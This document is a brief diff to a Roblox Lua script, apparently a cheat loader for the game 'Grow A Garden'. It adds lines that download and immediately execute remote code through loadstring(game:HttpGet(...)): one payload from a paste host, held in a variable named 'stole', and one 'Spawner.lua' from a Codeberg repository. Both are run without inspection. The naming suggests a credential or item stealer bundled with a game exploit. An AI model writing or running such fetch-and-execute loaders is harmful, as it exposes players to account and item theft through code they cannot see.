@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2EHJtzvAYir9Ynni/raw", true))()
+local stole = loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2EHJtzvAYir9Ynni/raw", true))()
+
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+stole.Load()
